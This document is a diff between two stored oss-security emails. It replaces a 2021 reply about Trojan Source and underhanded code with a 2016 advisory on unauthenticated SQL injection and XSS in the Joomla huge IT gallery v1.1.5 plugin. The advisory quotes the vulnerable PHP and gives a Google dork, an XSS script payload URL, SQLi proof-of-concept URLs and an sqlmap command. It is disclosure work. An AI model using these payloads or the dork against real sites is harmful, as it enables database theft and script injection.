@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1019" "Tuesday" "2" "November" "2021" "11:23:50" "-0500" "Josh Bressers" "josh@bress.net" nil "30" "Re: [oss-security] Trojan Source Attacks" nil nil nil "11" nil nil (number mark "U       josh@bress.n Nov  2   30/1019  " thread-indent "\"Re: [oss-security] Trojan Source Attacks\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] Trojan Source Attacks" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2933" "Thursday" "1" "September" "2016" "08:22:11" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<4C085536-DC31-4B21-B1DE-2DA8F1414995@me.com>" "73" "[oss-security] Updated: XSS and SQLi in huge IT gallery v1.1.5 for Joomla" nil nil nil "9" "2016090112:22:11" "[oss-security] Updated: XSS and SQLi in huge IT gallery v1.1.5 for Joomla" (number mark "U       larry0@me.co Sep  1   73/2933  " thread-indent "\"[oss-security] Updated: XSS and SQLi in huge IT gallery v1.1.5 for Joomla\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 15880 invoked by uid 550); 2 Nov 2021 16:24:14 -0000
+Received: (qmail 3702 invoked by uid 550); 1 Sep 2016 12:22:35 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,67 +12,102 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 15862 invoked from network); 2 Nov 2021 16:24:13 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=bress.net; s=google;
-        h=mime-version:references:in-reply-to:from:date:message-id:subject:to;
-        bh=Rm6HDAaWmed0UfAq5bBL3yIOTIa/LK3r+YRG2vcvERk=;
-        b=T/uF8mSEE213gwmJH0pQNO5KLrbf161CB4bmj+IqFnFLKmEK+8wby+SMDccQnzuCts
-         K5581E/edJ87UZZjUqXWjBT5gcUNEOGHjdm8wyD2MVtaxm8fF9XVP5VuOAqmtDmz4g9t
-         Ze9BfqWlMTgV0Fdpc2xSh6P837JgU4tBjTlIc=
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20210112;
-        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
-         :message-id:subject:to;
-        bh=Rm6HDAaWmed0UfAq5bBL3yIOTIa/LK3r+YRG2vcvERk=;
-        b=VBmCkGIL43v7w8o/Ei+sFssKuud7Gx11xbu1tVRZCH/8iWzvKR/+CJ5/n917cxaA2P
-         chN6BKc/zLciDiYD15TT584Q2B/lw7JvljsyLIRj7lwTj6FTGZJSGqfRKe4kTDujbvwF
-         U2r/KuqThS0GFF9swRqfGUYVF8zBaVJnR3To+pIvHcOtlv2zWLlg9L/3kRVBoaLUZMOz
-         xvaN+zFidlonrPk/yQpczYxJ4z+Wv8fH3J/9IopEn6TDIQQj0oTldC5zxETmFdo0M3dO
-         cfQ+viQa6OgP18PKFBE6rCxMLclHMfsb+1d67VcUq4NW6RnKDoZCUbspsymxbNjJ1Snl
-         DITw==
-X-Gm-Message-State: AOAM532kyYdjz20/aUctKTCve9HxvoS0+dx4fL11SXhHkCkcJkNJxmMi
-	fdFh6i5DlihXhLM4zwnDMPBPXyiun8Oqs0y66fvz19waLBEoJD0C
-X-Google-Smtp-Source: ABdhPJyhvv1YOgYPlTLxio4ZhrLVgaslwd1Mjlr3gTlld/RPtib1r6R0EW+ah+n0PK3jv7IjbQdnoweb8WLSC1zRtNA=
-X-Received: by 2002:a5d:9b86:: with SMTP id r6mr27536902iom.50.1635870241191;
- Tue, 02 Nov 2021 09:24:01 -0700 (PDT)
-MIME-Version: 1.0
-References: <c2d12374-0ed6-d6d4-60ea-799934b6f173@cl.cam.ac.uk> <D57DA3B6-A316-4E54-8DFC-AD70D0D08AC4@dwheeler.com>
-In-Reply-To: <D57DA3B6-A316-4E54-8DFC-AD70D0D08AC4@dwheeler.com>
-From: Josh Bressers <josh@bress.net>
-Date: Tue, 2 Nov 2021 11:23:50 -0500
-Message-ID: <CAKoP-y8CEv=h4a-ckLe+_p4WJk-CwzuXVCbBXTd8HrG+TSNmTw@mail.gmail.com>
-To: oss-security@lists.openwall.com
-Content-Type: multipart/alternative; boundary="000000000000a00a9105cfd0b8b8"
-Subject: Re: [oss-security] Trojan Source Attacks
+Received: (qmail 3658 invoked from network); 1 Sep 2016 12:22:32 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
+	t=1472732535; bh=t01hJXLQJjYPMjcXhoOTVzjuakKYtYnXdsF4tWKVGRs=;
+	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
+	b=PzXx3zFwf18zwteR92Q6OLLfpJInkyyTYSHirSiv1k/30Se7dhKrDJo/luZHx8h0c
+ Ls7PF7HwNXZq0tKQMtvw1Bran698p1EqrD+NzKUNysAhoxvG2BZiGgWcxNX6qluJlf
+ 8w5gR1WD8p3qDuFmh5tss1hX6WgTcVdLpiy2dPN31QE+dOV8jnka/6AJb/NV/J5Xtj
+ VIgXOkDGY/ScPsWdCRcrY6Q91XvEl9uUts6DhOLj9XWsEfvq9jBHtwMn96y2CGHUgF
+ ztfhd7nzUGZbQaeiZqQi7BlufqzPL/YZGy8i2CBY/wDTJGFf0SJvQg8XZdk11iyE7Q
+ HWAKLaOAc3LJw==
+X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
+ definitions=2016-09-01_05:,, signatures=0
+X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
+ clxscore=1015 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
+ bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
+ engine=8.0.1-1603290000 definitions=main-1609010135
+From: "Larry W. Cashdollar" <larry0@me.com>
+Content-type: text/plain; charset=us-ascii
+Content-transfer-encoding: quoted-printable
+Message-id: <4C085536-DC31-4B21-B1DE-2DA8F1414995@me.com>
+Date: Thu, 01 Sep 2016 08:22:11 -0400
+To: Open Source Security <oss-security@lists.openwall.com>
+MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
+X-Mailer: Apple Mail (2.3124)
+Subject: [oss-security] Updated: XSS and SQLi in huge IT gallery v1.1.5 for Joomla
 
---000000000000a00a9105cfd0b8b8
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+I thought I should share this here, this vulnerability doesn't require auth=
+entication to exploit it has been fixed in v1.1.6 not v1.1.7.
 
-On Tue, Nov 2, 2021 at 10:56 AM David A. Wheeler <dwheeler@dwheeler.com>
-wrote:
 
->
-> However, I think it=E2=80=99s important to realize this is a special case=
- of
-> =E2=80=9Cunderhanded code=E2=80=9D aka =E2=80=9Cunderhanded source code=
-=E2=80=9D aka =E2=80=9Cmaliciously
-> misleading code=E2=80=9D. Underhanded code is source code crafted so that=
- the
-> source code looks like it does one thing to human reviewers, but it
-> actually does something else. Homoglyphs are a common mechanism of attack
-> (e.g., 1/l or O/0), as are misleading indentation, etc.
->
-> The first reference I can find to underhanded code is the 2004 Obfuscated
-> V Contest (http://graphics.stanford.edu/~danielh/vote/vote.html) created
-> by Daniel Horn.
->
->
-You could argue the obfuscated C contest is related, that goes back to 1984.
-https://www.ioccc.org/years.html#1984
+Title: XSS and SQLi in huge IT gallery v1.1.5 for Joomla
+Author: Larry W. Cashdollar, @_larry0 Elitza Neytcheva, @E1337za=20
+Date: 2016-07-14
+Download Site: http://extensions.joomla.org/extensions/extension/photos-a-i=
+mages/galleries/gallery-pro
+Vendor: huge-it.com
+Vendor Notified: 2016-07-15, fixed v1.1.6
+Vendor Contact: info@huge-it.com
+Advisory: http://www.vapidlabs.com/advisory.php?v=3D164
+Description: The plugin allows you to add multiple images to the gallery, c=
+reate countless galleries, add a description to each of them, as well as ma=
+ke the same things with video links.
+Vulnerability:
+The attacker does not need to be logged in to Joomla to exploit this vulner=
+ability:
 
---=20
-     Josh
+SQL in code via id parameter:
+./administrator/components/com_gallery/models/gallery.php
+51     public function getPropertie() {
+52         $db =3D JFactory::getDBO();
+53         $id_cat =3D JRequest::getVar('id');
+54         $query =3D $db->getQuery(true);
+55         $query->select('#__huge_itgallery_images.name as name,'
+56                 . '#__huge_itgallery_images.id ,'
+57                 . '#__huge_itgallery_gallerys.name as portName,'
+58                 . 'gallery_id, #__huge_itgallery_images.description as d=
+escription,image_url,sl_url,sl_type,link_target,#__huge_itg    allery_image=
+s.ordering,#__huge_itgallery_images.published,published_in_sl_width');
+59         $query->from(array('#__huge_itgallery_gallerys' =3D> '#__huge_it=
+gallery_gallerys', '#__huge_itgallery_images' =3D> '#__huge_itg    allery_i=
+mages'));
+60         $query->where('#__huge_itgallery_gallerys.id =3D gallery_id')->w=
+here('gallery_id=3D' . $id_cat);
+61         $query->order('ordering desc');
+62=20
+64         $db->setQuery($query);
+65         $results =3D $db->loadObjectList();
+66         return $results;
+67     }
 
---000000000000a00a9105cfd0b8b8--
+XSS is here:
+
+root@Joomla:/var/www/html# find . -name "*.php" -exec grep -l "echo \$_GET"=
+ {} \;
+./administrator/components/com_gallery/views/gallery/tmpl/default.php
+root@Joomla:/var/www/html# find . -name "*.php" -exec grep -n "echo \$_GET"=
+ {} \;
+256:                    <a class=3D"modal" rel=3D"{handler: 'iframe', size:=
+ {x: 800, y: 500}}" href=3D"index.php?option=3Dcom_gallery&view=3Dvideo&tmp=
+l=3Dcomponent&pid=3D<?php echo $_GET['id']; ?>" title=3D"Image" >
+
+CVE-2016-1000113 SQLi
+CVE-2016-1000114 XSS
+Google Dork:
+inurl:option=3Dcom_gallery inurl:id
+
+Exploit Code:
+XSS PoC
+http://192.168.0.125/administrator/index.php?option=3Dcom_gallery&view=3Dga=
+llery&id=3D1--%20%22%3E%3Cscript%3Ealert(1);%3C/script%3E
+=20
+SQLi PoC
+http://192.168.0.125/administrator/index.php?option=3Dcom_gallery&view=3Dga=
+llery&id=3DSQLiHERE
+
+http://192.168.0.125/index.php?option=3Dcom_gallery&id=3DHERE
+=20
+$ sqlmap -u "http://192.168.0.125/index.php?option=3Dcom_gallery&id=3D*" --=
+dbms mysql=
